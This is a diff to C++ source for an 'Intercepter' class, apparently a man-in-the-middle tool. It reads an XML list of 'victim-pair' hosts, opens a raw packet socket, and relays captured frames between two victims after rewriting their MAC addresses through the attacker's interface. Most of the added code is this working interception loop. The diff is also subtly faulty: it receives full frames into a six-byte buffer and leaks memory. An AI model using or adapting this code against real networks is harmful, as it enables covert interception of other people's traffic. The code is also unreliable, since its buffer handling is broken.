@@ -15,16 +15,28 @@
 #include <libxml/tree.h>
 #include <net/ethernet.h>
 
+/**
+ * @brief Class constructor.
+ */
 Intercepter::Intercepter() : mp_interface(0) {
 }
 
+/**
+ * @brief Class destructor.
+ */
 Intercepter::~Intercepter() {
 }
 
+/**
+ * @bref Sets interface name.
+ */
 void Intercepter::SetInterface(std::string inface) {
 	mp_interface = new Interface(inface);
 }
 
+/**
+ * @brief Sets and loads input xml file.
+ */
 void Intercepter::SetFile(std::string f) {
 	xmlDocPtr doc = NULL;       /* document pointer */
 	xmlNodePtr root_node = NULL, node = NULL, dnode = NULL;/* node pointers */
@@ -33,13 +45,17 @@ void Intercepter::SetFile(std::string f) {
 	int index = 0;
 	bool is_ipv4 = false;
 	std::string node_content;
+	xmlChar *group_attr;
 
 	if ((doc = xmlReadFile(f.c_str(), NULL, 0)) == NULL)
 		print_msg_and_abort("Failed to open input XML file!");
 	root_node = xmlDocGetRootElement(doc);
 	for (node = root_node->children; node; node = node->next) {
 		if (node->type == XML_ELEMENT_NODE && strcmp((char *)node->name, "host") == 0) {
-			strindex = (const char*)xmlGetProp(node, (const xmlChar*)"group");
+			group_attr = xmlGetProp(node, (const xmlChar*)"group");
+			if (group_attr == 0)
+				continue;
+			strindex = (const char*)group_attr;
 			mac = (const char*)xmlGetProp(node, (const xmlChar*)"mac");
 			strindex = std::regex_replace(strindex, std::regex("victim-pair-"), "");
 			index = atoi(strindex.c_str());
@@ -59,11 +75,17 @@ void Intercepter::SetFile(std::string f) {
 	}
 }
 
+/**
+ * @brief Frees data structures.
+ */
 void Intercepter::Free() {
 	mp_interface->Free();
 	delete mp_interface;
 }
 
+/**
+ * @brief Adds host as member.
+ */
 void Intercepter::AddHost(unsigned int index, std::string mac) {
 	unsigned char *m = new unsigned char[6];
 	Host *p_host = new Host();
@@ -72,21 +94,55 @@ void Intercepter::AddHost(unsigned int index, std::string mac) {
 	p_host->SetMAC(m);
 }
 
-void Intercepter::Start() {
+/**
+ * @brief Runs interception.
+ */
+void *Intercepter::Start(void) {
 	int sock_fd = OpenSocket();
 	struct sockaddr_ll sll;
-
+	InitSLL(&sll);
+	unsigned char *buffer = new unsigned char[ETHER_ADDR_LEN];
+	Host *host1 = 0, *host2 = 0;
+	for (auto &i : m_hostsMap) {
+		if (!i.second[0]->m_isUsed) {
+			host1 = i.second[0];
+			host1->m_isUsed = true;
+			host2 = i.second[1];
+			break;
+		}
+		else if (!i.second[1]->m_isUsed) {
+			host1 = i.second[1];
+			host1->m_isUsed = true;
+			host2 = i.second[0];
+			break;
+		}
+	}
+	const unsigned char *src = host1->GetMAC();
+	const unsigned char *dst = host2->GetMAC();
+	while (true) {
+		if (recv(sock_fd, buffer, ETH_FRAME_SIZE, 0) < 0)
+			continue;
+		if (Host::CompareUSChar(buffer + ETHER_ADDR_LEN, src, ETHER_ADDR_LEN)) {
+			memcpy(buffer, dst, ETHER_ADDR_LEN);
+			memcpy(buffer + ETHER_ADDR_LEN, mp_interface->m_mac, ETHER_ADDR_LEN);
+			sendto(sock_fd, (const void *)buffer, ETH_FRAME_SIZE, 0,
+					(const struct sockaddr *)&sll, sizeof(struct sockaddr_ll));
+		}
+	}
 }
 
+/**
+ * @brief Opens socket.
+ */
 int Intercepter::OpenSocket() {
 	int socket_fd = 0;
-	struct timeval tv_limit;
-	tv_limit.tv_sec = 2;
-	tv_limit.tv_usec = 2000;
+	struct timeval te;
+	te.tv_sec = 0;
+	te.tv_usec = 40000;
 
-	if ((socket_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
+	if ((socket_fd = socket(AF_PACKET, SOCK_RAW, htons(0x0800))) == -1)
 		print_msg_and_abort("socket failed!");
-	if (setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv_limit, sizeof(struct timeval)) != 0)
+	if (setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&te, sizeof(struct timeval)) != 0)
 		print_msg_and_abort("setsockopt failed!");
 	if (setsockopt(socket_fd, SOL_SOCKET, SO_BINDTODEVICE, mp_interface->m_name.c_str(), sizeof(char) * mp_interface->m_name.length()))
 		print_msg_and_abort("setsockopt failed!");
@@ -94,6 +150,9 @@ int Intercepter::OpenSocket() {
 	return socket_fd;
 }
 
+/**
+ * @brief Add IPv4/IPv6 address as member.
+ */
 void Intercepter::AddAddress(unsigned int index, std::string ip, bool ipv4) {
 	unsigned char *ip_addr;
 	std::map<unsigned int, std::vector<Host *>>::const_iterator pos = m_hostsMap.find(index);
@@ -110,10 +169,13 @@ void Intercepter::AddAddress(unsigned int index, std::string ip, bool ipv4) {
 	}
 }
 
-void Intercepter::InitSSL(struct sockaddr_ll *sll) {
+/**
+ * @brief Initializes sockaddr_ll structure.
+ */
+void Intercepter::InitSLL(sockaddr_ll *sll) {
 	memset(sll, 0, sizeof(struct sockaddr_ll));
 	sll->sll_family = htons(AF_PACKET);
-	sll->sll_protocol = htons(ETH_P_ALL);
+	sll->sll_protocol = htons(0x0800);
 	sll->sll_ifindex = if_nametoindex(mp_interface->m_name.c_str());
 	sll->sll_halen = ETHER_ADDR_LEN;
 	memcpy(sll->sll_addr, mp_interface->m_mac, ETHER_ADDR_LEN);
